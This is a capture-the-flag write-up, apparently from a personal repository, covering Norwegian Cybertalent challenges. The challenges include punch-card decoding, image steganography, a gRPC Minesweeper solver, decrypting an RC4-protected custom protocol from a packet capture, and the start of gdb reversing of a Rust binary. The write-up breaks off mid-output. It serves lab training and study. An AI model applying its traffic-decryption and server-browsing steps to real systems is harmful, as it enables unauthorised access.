| **7**  | 0 | 0 | 1 | 0 | 0 | 0 | 0 | 0 | 0 | 0  | 0 	|
| **8** 	| 1 | 0	| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0  | 0 	|
| **9** 	| 0 | 0 | 0 | 1 | 0 | 0 | 0 | 0 | 0 | 1  | 0 	|

Extracting each column into a list gives us the following:
```
1.  100000000010
2.  011000100000
3.  101000000100
4.  101000000001
5.  110000010000
6.  100000000000
7.  010000100000
8.  011000100000
9.  110000010000
10. 101000000001
11. 110000010000
```

Adding them togheter gives us this string: `100000000010011000100000101000000100101000000001110000010000100000000000010000100000011000100000110000010000101000000001110000010000`

It should now be easy to map the column and rows to their characters, we therefore write a parser that does this for us and with that solve the challenge. We also see that the generated card matches the grid we found in the horse.

```sh
$ python parse_ibm-ebcdic.py code --generate-card 100000000010011000100000101000000100101000000001110000010000100000000000010000100000011000100000110000010000101000000001110000010000
Output: Hugin&Munin
```


<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/solve.png" width="200">


[Huginn and Muninn](https://en.wikipedia.org/wiki/Huginn_and_Muninn) are two ravens that brought information to the most powerful Norse god, Odin. They can see every little movement on the earth, they hear every sound, and then they report back to Odin. That's the reason we can find the ravens in the Coat of Arms for the Norwegian Intelligence Service (Etteretningstjenesten).


<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/etterretningstjenesten-logo.png" width="200">

You can also find them on the [frontpage of the CTF](https://ctf.cybertalent.no/).

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/pixelravn.gif" width="200">


```
login@corax:~$ scoreboard 'Hugin&Munin'
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.8_punchcard
Svar:     Hugin&Munin

Gratulerer, korrekt svar!
```

##### More fun
The script also allows us the create our own cards.

```sh
$ python parse_ibm-ebcdic.py --generate-card text 'Hello, thi$ is IBM-EBCDIC punch c@rd from [2021]'

100000000010101000010000110001000000110001000000110000001000001001000010000000000000011001000000101000000010101000000001010001000010000000000000101000000001011010000000000000000000100000000001100010000000010000100000010000000000100000010000100010000000100001000000100000100000100000000001100001000000000000000000110000000100011000100000110000010000101001000000101000000010000000000000101001000000000000100010110000000001101000100000000000000000101000001000110000000001110000001000110000100000000000000000100010000010000010000000001000000000000010000000000100000000001010000010
```

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/hello_2021.png" width="200">

```
$ python parse_ibm-ebcdic.py --generate-card text klarz
Output: 110010000000110001000000101100000000110000000001011000000001


$ python parse_ibm-ebcdic.py code 110010000000110001000000101100000000110000000001011000000001
Output: klarz
```

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/klarz.png" width="200">


###### [`parse_ibm-ebcdic.py`](./3_utfordringer/1_lett/punchcard/parse_ibm-ebcdic.py)



### [3.1.9_secret](./3_utfordringer/1_lett/secret)

**Note:** I solved this "challenge" after the CTF.

From the Norwegian Armed Force's page about the [Cybertalent Program](https://www.forsvaret.no/jobb/talentprogram-cyberoperasjoner) we find the following image, that contains some shell commands. We see that a file was moved to /dev/shm, and find the secret there.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/rust_lett/screenshots/aa8ba51c503042c48257d4944ec668c6.jpg" width="200">

```
login@corax:~$ ls -altr /dev/shm/
total 4
drwxr-xr-x 5 root root 340 Jan 21 15:45 ..
-rw-r--r-- 1 root root  33 Jan 21 15:45 .secret
drwxrwxrwt 2 root root  60 Jan 21 15:45 .
login@corax:~$ cat /dev/shm/.secret
7238876002abdfd7f091fa8978cbadee
```

```
login@corax:~$ scoreboard 7238876002abdfd7f091fa8978cbadee
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.9_secret
Svar:     7238876002abdfd7f091fa8978cbadee

Gratulerer, korrekt svar!
```

















## [3.2. Utfordringer middels](./3_utfordringer/2_middels)


### [3.2.1_coordinate](./3_utfordringer/2_middels/coordinate)

We are given the following image.

![2e38a163419af4e8eb0ecbfc9b029173.png](./2_middels/coordinate/coordinate.png)

Using `zsteg` we find interesting data in the `green` and `blue` layer of the image, and assume that each of the sub-challenges are related to their own layer (`r`, `g`, `b`, `a` => `red`, `green`, `blue`, `alpha`)

```shell
$ zsteg -a
b8,g,lsb,xy         .. text: "[ X, Y, Z ] =\r\n[[ 4.46951449e+00, 2.56443868e+01, 4.82221609e+01, 2.75919604e+00,\r\n   6.39779539e+00, 5.82768924e+00, 4.59417363e+01, 1.02990843e+01,\r\n   9.02752721e+00, 2.95875663e+01, 5.21653404e+01, 7.40382644e+00,\r\n   1.87583859e+01, 4.15926138e+00, 2."
b8,b,lsb,xy         .. text: "[37.4040208986156, -122.11557126842482]\r\n[38.88824944889722, -77.02301190382201]\r\n[34.17304019448849, -117.88486574343878]\r\n[26.16538153242349, -80.31681550621417 ]\r\n[52.540198575411445, 13.626773749372456]\r\n[53.51014017498718, -2.395029415893364]\r\n[41.590"
```

#### [3.2.1_coordinate_r](./3_utfordringer/2_middels/coordinate/r)

The red layer has 8 red pixels.

![20991d29f4167b852800d3c94d8a05aa.png](./3_utfordringer/2_middels/coordinate/r/screenshots/82ee3030720647e69d9b4fb6e9fe4168.png)

We check the positioning of the pixels with a small script, and find the pixels at the following coordinates.

```
x	y
98	3
101	7
105	5
108	8
112	4
115	1
117	2
120	6
```

The x coordinates are within the decimal ASCII range and transform them as such.

###### [solve_r.py](./3_utfordringer/2_middels/coordinate/r/solve_r.py)

```python
from PIL import Image
image = Image.open("coordinates_red.png")
pixels = {}
for x in range(image.size[0]):
    for y in range(image.size[1]):
        p = image.getpixel((x, y))
        if p != 0:
            # print(x, y, sep="\t")
            pixels[y] = x
pixels = dict(sorted(pixels.items()))
print("Flag:", "".join([chr(x) for x in pixels.values()]))
```

```sh
$ python3 solve_r.py
Flag: subpixel
```

```sh
login@corax:~$ scoreboard subpixel
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.1_coordinate_r
Svar:     subpixel

Gratulerer, korrekt svar!
```


#### [3.2.1_coordinate_g](./3_utfordringer/2_middels/coordinate/g)

From our initial checking, we know that the green layer contains embedded XYZ coordinates.

```sh
$ zsteg coordinate.png -e b8,g,lsb,xy > b8_g.txt
$ cat b8_g.txt | head
[ X, Y, Z ] =
[[ 4.46951449e+00, 2.56443868e+01, 4.82221609e+01, 2.75919604e+00,
   6.39779539e+00, 5.82768924e+00, 4.59417363e+01, 1.02990843e+01,
   9.02752721e+00, 2.95875663e+01, 5.21653404e+01, 7.40382644e+00,
   1.87583859e+01, 4.15926138e+00, 2.18268791e+01, 1.19171121e+01,
   4.43151990e+01, 7.97109610e+00, 2.98474193e+01, 4.33063315e+01,
   4.83478327e+01, 1.10814799e+01, 4.48824687e+01, 2.39702859e+01,
   3.95335509e+01, 5.43953649e+01, 1.31411056e+01, 3.44025955e+01,
   3.10266857e+01, 3.60681869e+01, 1.70946907e+01, 1.44202318e+01,
   2.36704385e+01, 2.66075870e+01, 4.00664992e+01, 1.56470618e+01,
```

Plotting this with `matplotlib` and its `scatter(X, Y, Z)` function, we get the following image.

`$ python solve_g.py`

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/g/screenshots/2bd636b36639402b84bc5c33d3fce03d.gif" width="300">

##### [`solve_g.py`](./3_utfordringer/2_middels/coordinate/g/solve_g.py)
```python
import re
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import axes3d

# Quick messy data parsing
with open("b8_g.txt") as f:
    data = f.read().replace("[ X, Y, Z ] =", "").replace("\n", "").replace(" ", "").strip()
	XYZ = []
	for positions in data.split("]")[:-2]:
		positions = positions.replace("]", "").replace("[", "")
		XYZ.append([float(value) for value in positions.split(",") if value])

X, Y, Z = XYZ
fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')
ax.scatter(X, Y, Z)
plt.show()
```

```sh
login@corax:~$ scoreboard focal point
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.1_coordinate_g
Svar:     focal point

Gratulerer, korrekt svar!
```

#### [3.2.1_coordinate_b](./3_utfordringer/2_middels/coordinate/b)

Instead of writing down the number manually, we extract the embedded data.
```shell
$ zsteg coordinate.png -e b8,b,lsb,xy > b8_b.txt
[37.4040208986156, -122.11557126842482]
[38.88824944889722, -77.02301190382201]
[34.17304019448849, -117.88486574343878]
[26.16538153242349, -80.31681550621417 ]
[52.540198575411445, 13.626773749372456]
[53.51014017498718, -2.395029415893364]
[41.59016842165888, -93.6275330132897]
[37.80074583736261,-122.45645702947891]
```

The data look like GPS coordinates, and when plotting them into Google Maps we see that they are coordinates to streets/rivers/buildings that are supposed to look like letters, giving us the following:

* `37.4040208986156, -122.11557126842482`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/545ffcbbf6c6449ea45122e427c6fcc5.png" width="100">

**F**

**Flag:** `F`

* `38.88824944889722, -77.02301190382201`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/7805570b38334a248b75e3370af708c0.png" width="100">

**O**

**Flag:** `FO`

* `34.17304019448849, -117.88486574343878`
This one initially didn't make sense, but after checking the satellite map, we see that it's supposed to be the letter `N`.
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/bfe894cbe99f4ccc8dc67de6a80995a3.png" width="100">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/b0bc721629e640ae8e002055cea6785c.png" width="100">

**N**

**Flag:** `FON`

* `26.16538153242349, -80.31681550621417`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/2af28ac30505472b814511da955549fb.png" width="100">

**T**

**Flag:** `FONT`

* `52.540198575411445, 13.626773749372456`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/6675a70367704d65a9dbe4aaf20cafc4.png" width="100">

**S**

**Flag:** `FONTS`

* `53.51014017498718, -2.395029415893364`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/101208d8a17f47eaa206a6c07ddf0ffc.png" width="100">

**I**

**Flag:** `FONTSI`

* `41.59016842165888, -93.6275330132897`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/ab05b311a2c34443a231cefbd0815b73.png" width="100">

**Z**

**Flag:** `FONTSIZ`


* `37.80074583736261,-122.45645702947891`
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/b/screenshots/2ede67f325e54c2c8e44c7f82fe738f8.png" width="100">

**E**

**Flag:** `FONTSIZE`

```sh
login@corax:~$ scoreboard FONTSIZE
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.1_coordinate_b
Svar:     FONTSIZE

Gratulerer, korrekt svar!
```


#### [3.2.1_coordinate_a](./3_utfordringer/2_middels/coordinate/a)

This was solved easily with `stegosolve`, we find the following QR code in **Alpha plane 1**. 

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/a/screenshots/2092a017bd4448e2a2aead102f7fcfb9.png" width="200">

Scanning the QR code gives us `w3w:///daytime.hacking.above` and finially coordinates to the lake named `Lutvannet`.

https://what3words.com/daytime.hacking.above

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/coordinate/a/screenshots/4fa6af714b5f422bbd18a5f5c633a410.png" width="200">

```shell
login@corax:~/3_utfordringer/2_middels/coordinate$ scoreboard Lutvannet
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.1_coordinate_a
Svar:     Lutvannet

Gratulerer, korrekt svar!
```


### [3.2.2_minesweeper](./3_utfordringer/2_middels/minesweeper)

We are supposed to create a [Minesweeper](https://en.wikipedia.org/wiki/Minesweeper_(video_game)) client that communicates with a server over [gRPC](https://grpc.io/).

The challenge is seperated into 3 levels, where we have to solve each level within x amount of seconds:
- **Easy**: 1 board, max 1 hour.
- **Medium**: 7 boards, max 10 seconds per board.
- **Hard**: 2 boards, max 5 seconds per board.

The [README](./3_utfordringer/2_middels/minesweeper/LESMEG.md) also recommends writing the client in a compiled language, due to the time limitations and optimizations vs. a scripted language.

Having never touched neither **gRPC** nor a Minesweeper board solver, I had to spend some time searching for various sources, see **Reading material** below.

My thoughts were to write the client in [Golang](https://golang.org/), as I have never touched it and want to learn it one day. After spending some time with Golang I decided to go back to Python, which I am very familiar with. 


#### Client

```shell
$ python -m grpc_tools.protoc \
-I./ \
--python_out=. \
--grpc_python_out=. \
./minesweeper.proto
```

I started writing my own solver based on the research I did above, however halfway there I decided to go another route, and use [another solver](https://github.com/madewokherd/mines) as a helper to my solver.

You can find my solver [here](./3_utfordringer/2_middels/minesweeper/client.py).

#### Flags

To somewhat mitigate the slow and unoptimized solver, I decided to setup a port forward with `socat` (another option is [`shuttle`](https://github.com/sshuttle/sshuttle)) and run the solver locally.

```shell
$ python client.py localhost 1989
Starting client...
Fetching new game...
Starting level
<Game started=True, level_id=JXh1eG9KId73wn5F>
<Board row_count=5, column_count=5, mine_count=1>
0	-	-	-	-
-	-	-	-	-
-	-	-	-	-
-	-	-	-	-
-	-	-	-	-
</Board>
</Game>
Finding solution
Solved level ID JXh1eG9KId73wn5F
Got flag for level ID JXh1eG9KId73wn5F: 0b5408469e617df0e380b7364cdc1d27
--- snip ---
```
![92026d86ccd541bbb08bc89946504894.gif](./3_utfordringer/2_middels/minesweeper/screenshots/92026d86ccd541bbb08bc89946504894.gif)

```shell
login@corax:~$ scoreboard 0b5408469e617df0e380b7364cdc1d27
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.2_minesweeper_easy
Svar:     0b5408469e617df0e380b7364cdc1d27

Gratulerer, korrekt svar!
```
```shell
login@corax:~$ scoreboard 5315005b2ad1fbfc2ceaa9a20d646383
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.2_minesweeper_medium
Svar:     5315005b2ad1fbfc2ceaa9a20d646383

Gratulerer, korrekt svar!
```
```shell
login@corax:~$ scoreboard f94148481b7e295ebfb74490838f5c57
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.2_minesweeper_hard
Svar:     f94148481b7e295ebfb74490838f5c57

Gratulerer, korrekt svar!
```

### Reading materials
- [Minesweeper strategy](http://www.minesweeper.info/wiki/Strategy)
- [Minesweeper and NP-completeness](http://web.mat.bham.ac.uk/R.W.Kaye/minesw/ordmsw.htm)
- [Write an AI to play Minesweeper](https://cs50.harvard.edu/ai/2020/projects/1/minesweeper/)
- [Solving minesweeper](https://danamlund.dk/minesweeper_solver/#org836c750)





### [3.2.3_transfer](./3_utfordringer/2_middels/transfer)

We are provided with a README (`LESMEG.md`, seen below), some documentation, which has been heavily redacted, and a network traffic capture file (`capture.pcapng`).

```
# Transfer
 
### Del 1
Vi har funnet denne nettverksdumpen som benytter en ukjent protokoll.
Kan du å tilbakevikle protokollen for å forstå hva slags data som overføres?
 
Fil: capture.pcapng
 
### Del 2
Vi kan nå serveren som var i nettverksdumpen. Kan du Koble til serveren og finne noe interessant på serveren?
 
Adresse: tcp://transfer:1334'
```


###### [documentation.pdf](./3_utfordringer/2_middels/transfer/documentation.pdf)

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/transfer/screenshots/fdc153d857084628b197823b79f9f03e.png" width="200">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/2_middels/transfer/screenshots/cfee4412b5bd4ad1b2014672c4b886ab.png" width="200">



#### [3.2.3_transfer_easy](./3_utfordringer/2_middels/transfer/easy)

The documentation provides information in regards to the transfer protocol. We finish skimming through it and continue by opening the `pcapng` in Wireshark and extract every "transfer" packet and start splitting up the data in the packets as noted in the documentation. 

---

##### Transport packets
In the table below the `DIRECTION` column is referring to the directo of the packet (from or to the server).

| # | DIRECTION | MAGIC         | SEQ NUM       | I*    | LENGTH | CONTENT |
| - | - | ------------- | ------------- | ----- | -----  | -----   | 
| 1 | TO | 46494c45 | 0000000000000000 | 00 | 0000000000000000 | |
| 2 | FROM | 46494c45 | 380b16455cd30726 | 09 | 0000000000000000 | |
| 3 | TO | 46494c45 | 380b16455cd30726 | 01 | 0000000000000010 | 5a33566c633351365a33566c6333513d |
| 4 | FROM | 46494c45 | 380b16455cd30727 | 0a | 0000000000000018 | 5a4254577a7162314e727532796d714d5835516c72673d3d |
| 5 | TO | 46494c45 | 380b16455cd30727 | 02 | 0000000000000000 | |
| 6 | FROM | 46494c45 | 380b16455cd30728 | 0b | 0000000000000004 | 556b4d30 |
| 7 | TO | 46494c45 | 380b16455cd30728 | 03 | 0000000000000000 | |
| 8 | FROM | 46494c45 | 380b16455cd30729 | 0c | 000000000000002c | 4f37564733624461513671654d6d537a453035357a72526a3951334d306e61523156436c7037704e73413d3d |
| 9 | TO | 46494c45 | 380b16455cd30729 | 05 | 0000000000000008 | 4e42377873386f42 |
| 10 | FROM | 46494c45 | 380b16455cd3072a | 0c | 0000000000000000 | |
| 11 | TO | 46494c45 | 380b16455cd3072a | 06 | 0000000000000000 | |
| 12 | FROM | 46494c45 | 380b16455cd3072b | 0c | 000000000000016c | 5577626a6c51534e726d664a424c78324b54307a614969654261544254447256706564623464376a57706f2b6d75422f746d752f4843645044497631757078393477344c4759526d7645554f466732756c707436474b55536b46566868414a486875612f6c39505557725a4f30305a432f79642f2f636c44616459737757596b363749614166302f35414c564f66746c755569636a46646f6145344836366435743255742b394848654464774a724447625a49796b354a467469653155434b414b304a53706d2f35344b48444764664757572b444e35577470636c354a62717a346953465358563542786e53627a786e46703371646463522f334667505254632b486759695a316d48726950462f7747436a39466f49766230384473656847794145564d5a67764a386f5665387671427450726e66726f413872696749796b2f6158364c45337a51592b2b696f50787a4278426f433738576d6b6a6f6d6476385557354534623253622b303d |
| 13 | TO | 46494c45 | 380b16455cd3072b | 05 | 000000000000000c | 686132464930666a6836773d |
| 14 | FROM | 46494c45 | 380b16455cd3072c | 0c | 0000000000000000 | |
| 15 | TO | 46494c45 | 380b16455cd3072c | 07 | 0000000000000030 | 6541625579766b6c65783336587749424256586b394a425068364351636a61442b65556e37586b73483061736f773d3d |
| 16 | FROM | 46494c45 | 380b16455cd3072d | 0c | 0000000000000000 | |
| 17 | TO | 46494c45 | 380b16455cd3072d | 06 | 0000000000000000 | |
| 18 | FROM | 46494c45 | 380b16455cd3072e | 0c | 0000000000000030 | 5464597a62566141645730615968497372444a687568474a454845416f6e4a546f482f584b537372707a344e61413d3d |
| 19 | TO | 46494c45 | 380b16455cd3072e | 07 | 000000000000002c | 4a5a47644f4f7145334e624b6c6b494c5663666a56794d34767677597448444e796e43795635776b4b57383d |
| 20 | FROM | 46494c45 | 380b16455cd3072f | 0c | 0000000000000000 | |
| 21 | TO | 46494c45 | 380b16455cd3072f | 06 | 0000000000000000 | |
| 22 | FROM | 46494c45 | 380b16455cd30730 | 0c | 000000000000002c | 64547a684c794e35346c67534a35685355782b614a73677376492f5746766b77434c4b77452f516a2b68513d |

---

##### Reversing
We know that the interesting data will be in the `CONTENT` header and attempt to decode the hex values of the first packets, and then notice that the unhexed content is in fact **base64** encoded strings. 

| # | HEX | BASE64 | DECODED |
| - | - | - | - | 
| 1 | 5a33566c633351365a33566c6333513d | Z3Vlc3Q6Z3Vlc3Q= | guest:guest |
| 2 | 556b4d30 | UkM0 | RC4 |
| 3 | 4f37564733624461513671654d6d537a453035357a72526a3951334d306e61523156436c7037704e73413d3d | O7VG3bDaQ6qeMmSzE055zrRj9Q3M0naR1VClp7pNsA== | **_RAW DATA_** |
| 4 | 5a4254577a7162314e727532796d714d5835516c72673d3d | ZBTWzqb1Nru2ymqMX5Qlrg== | **_RAW DATA_** |

---

##### Encryption
Packet #3 and #4 contain raw that after we decoded them, but the packet before (packet #2) hint us toward [RC4 (Rivest Cipher 4)](https://en.wikipedia.org/wiki/RC4), which is a stream cipher. Knowing this, we assume that packet #3 contains the decrypted data, and packet #4 contains the key provided to the user after it logged in with `guest:guest` as username and password.

Plotting this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4(%7B'option':'Base64','string':'ZBTWzqb1Nru2ymqMX5Qlrg%3D%3D'%7D,'Latin1','Latin1')&input=TzdWRzNiRGFRNnFlTW1TekUwNTV6clJqOVEzTTBuYVIxVkNscDdwTnNBPT0) we successfully decrypted the packet contents:
```sh
ls /tmp/transfer
FLAG_1
FLAG_2
```

---

##### Flag

Now that we know that the communication between the client and the server is encrypted with RC4, we continue with appending the contents of each packet:

```
3bb546ddb0da43aa9e3264b3134e79ceb463f50dccd27691d550a5a7ba4db0341ef1b3ca015306e395048dae67c904bc76293d3368889e05a4c14c3ad5a5e75be1dee35a9a3e9ae07fb66bbf1c274f0c8bf5ba9c7de30e0b198466bc450e160dae969b7a18a51290556184024786e6bf97d3d45ab64ed34642ff277ffdc94369d62cc16624ebb21a01fd3fe402d539fb65b9489c8c5768684e07eba779b7652dfbd1c778377026b0c66d9232939245b627b55022802b4252a66ff9e0a1c319d7c6596f833795ada5c97925bab3e224854975790719d26f3c67169dea75d711ff71603d14dcf87818899d661eb88f17fc060a3f45a08bdbd3c0ec7a11b200454c660bc9f2855ef2fa81b4fae77eba00f2b8a023293f697e8b137cd063efa2a0fc730710680bbf169a48e899dbfc516e44e1bd926fed85ad852347e387ac7806d4caf9257b1dfa5f02010555e4f4904f87a090723683f9e527ed792c1f46aca34dd6336d5680756d1a62122cac3261ba1189107100a27253a07fd7292b2ba73e0d6825919d38ea84dcd6ca96420b55c7e3572338befc18b470cdca70b2579c24296f753ce12f2379e25812279852531f9a26c82cbc8fd616f93008b2b013f423fa14
```

Plotting this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')RC4(%7B'option':'Base64','string':'ZBTWzqb1Nru2ymqMX5Qlrg%3D%3D'%7D,'Latin1','Latin1')&input=M2JiNTQ2ZGRiMGRhNDNhYTllMzI2NGIzMTM0ZTc5Y2ViNDYzZjUwZGNjZDI3NjkxZDU1MGE1YTdiYTRkYjAzNDFlZjFiM2NhMDE1MzA2ZTM5NTA0OGRhZTY3YzkwNGJjNzYyOTNkMzM2ODg4OWUwNWE0YzE0YzNhZDVhNWU3NWJlMWRlZTM1YTlhM2U5YWUwN2ZiNjZiYmYxYzI3NGYwYzhiZjViYTljN2RlMzBlMGIxOTg0NjZiYzQ1MGUxNjBkYWU5NjliN2ExOGE1MTI5MDU1NjE4NDAyNDc4NmU2YmY5N2QzZDQ1YWI2NGVkMzQ2NDJmZjI3N2ZmZGM5NDM2OWQ2MmNjMTY2MjRlYmIyMWEwMWZkM2ZlNDAyZDUzOWZiNjViOTQ4OWM4YzU3Njg2ODRlMDdlYmE3NzliNzY1MmRmYmQxYzc3ODM3NzAyNmIwYzY2ZDkyMzI5MzkyNDViNjI3YjU1MDIyODAyYjQyNTJhNjZmZjllMGExYzMxOWQ3YzY1OTZmODMzNzk1YWRhNWM5NzkyNWJhYjNlMjI0ODU0OTc1NzkwNzE5ZDI2ZjNjNjcxNjlkZWE3NWQ3MTFmZjcxNjAzZDE0ZGNmODc4MTg4OTlkNjYxZWI4OGYxN2ZjMDYwYTNmNDVhMDhiZGJkM2MwZWM3YTExYjIwMDQ1NGM2NjBiYzlmMjg1NWVmMmZhODFiNGZhZTc3ZWJhMDBmMmI4YTAyMzI5M2Y2OTdlOGIxMzdjZDA2M2VmYTJhMGZjNzMwNzEwNjgwYmJmMTY5YTQ4ZTg5OWRiZmM1MTZlNDRlMWJkOTI2ZmVkODVhZDg1MjM0N2UzODdhYzc4MDZkNGNhZjkyNTdiMWRmYTVmMDIwMTA1NTVlNGY0OTA0Zjg3YTA5MDcyMzY4M2Y5ZTUyN2VkNzkyYzFmNDZhY2EzNGRkNjMzNmQ1NjgwNzU2ZDFhNjIxMjJjYWMzMjYxYmExMTg5MTA3MTAwYTI3MjUzYTA3ZmQ3MjkyYjJiYTczZTBkNjgyNTkxOWQzOGVhODRkY2Q2Y2E5NjQyMGI1NWM3ZTM1NzIzMzhiZWZjMThiNDcwY2RjYTcwYjI1NzljMjQyOTZmNzUzY2UxMmYyMzc5ZTI1ODEyMjc5ODUyNTMxZjlhMjZjODJjYmM4ZmQ2MTZmOTMwMDhiMmIwMTNmNDIzZmExNA) again we are provided with the first flag.

```sh
ls /tmp/transfer
FLAG_1
FLAG_2
FLAG_1â..â..â..â..â..â..â..â.®
â.. FLAG â.°â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â.®
â.. 0a6c08918fc64daa57b4faa13f60db8b â..
â.°â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â..â.¯
kake.txtTorsk er en hest som skyter festenTorsk er en hest som skyter festenKake er en hest som smaker torskKake er en hest som smaker torsk
```

```sh
login@corax:~$ scoreboard 0a6c08918fc64daa57b4faa13f60db8b
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.3_transfer_easy
Svar:     0a6c08918fc64daa57b4faa13f60db8b

Gratulerer, korrekt svar!
```



#### [3.2.3_transfer_medium](./3_utfordringer/2_middels/transfer/medium)

We recall from **3.2.3_transfer_easy** that there is a `FLAG_2` in `/tmp/transfer`, and therefore need to implement the transport protocol so that we can fetch the flag.

---

##### Instructions
We start by going back to the documentation, coupled with the decrypted packets and start defining the instructions.

| VALUE | INSTRUCTION NAME |
| - | - |
| 0 | Connect |
| 1 | Login |
| 2 | Okay |
| 3 | List files |
| 4 | ? |
| 5 | Open file |
| 6 | Print file |
| 7 | Write to file |
| 8 | ? |
| 9 | Request credentials |
| 10 | Encryption key |
| 11 | Encryption algorithmn |
| 12 | Success |
| 13 | Failure |
| >13 | NoOp (Other) |

---

##### Transfer Client
I decided it would be easier to simply implement the entire transfer protcol in a transfer client CLI, you can find it [here](./3_utfordringer/2_middels/transfer/medium/transfer_client.py). With this I found that instruction #4 was used to change directories, whilst instruction #8 was used to disconnect.

**Foreshadowing:** this CLI will be **_very_** helpful later on.

---

##### Flag

```bash
$ python transfer_client.py transfer 1334
root@transfer:/tmp/transfer$ ls
FLAG_1
FLAG_2
root@transfer:/tmp/transfer$ cat FLAG_1
╭──────╮
│ FLAG ╰───────────────────────────╮
│ 0a6c08918fc64daa57b4faa13f60db8b │
╰──────────────────────────────────╯
root@transfer:/tmp/transfer$ cat FLAG_2
╭──────╮
│ FLAG ╰───────────────────────────╮
│ cd29703ea8013a4b9c2df2ad0ade9594 │
╰──────────────────────────────────╯
root@transfer:/tmp/transfer$ cd ..
root@transfer:/tmp$ cd /
root@transfer:/$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
.dockerenv
```

```
login@corax:~$ scoreboard cd29703ea8013a4b9c2df2ad0ade9594
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.3_transfer_medium
Svar:     cd29703ea8013a4b9c2df2ad0ade9594

Gratulerer, korrekt svar!
```



### [3.2.4_rusty_reversing_medium](./3_utfordringer/2_middels/rust_middels)

We are again provided with a binary with `debug_info` (debug symbols) set.

```
$ file rust_medium
rust_medium: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=64d74b20dd52b19944357f7c1d43dc5dbd3d21a3, with debug_info, not stripped
```

Attempting the same method as last time (searching for `flag` in the defined strings) I was presented with this part within the `main` function.

![b2400ca45c014bcfaadc859b63c7fa28.png](./3_utfordringer/2_middels/rust_middels/screenshots/b2400ca45c014bcfaadc859b63c7fa28.png)

#### gdb
Not seeing any obvious flags/passwords here I attempted to use [peda](https://github.com/longld/peda) version of [`gdb`](https://www.gnu.org/software/gdb/) and break at the `core::str::converts::from_utf8` function.
_Do not that I am very new to gdb, and there are most likely better ways to solving this_.

We set a breakpoint (`b from_utf8`) at the `from_utf8` function, run the binary, and input some random password.

```
$ gdb -q rust_medium
Reading symbols from rust_medium...
gdb-peda$ b from_utf8
Breakpoint 1 at 0x4754b: file library/core/src/str/converts.rs, line 86.
gdb-peda$ r
Starting program: 3_utfordringer/2_middels/rust_middels/rust_medium
Enter password: PASSWORD
[----------------------------------registers-----------------------------------]
RAX: 0x7fff2eb21cc0 --> 0x3
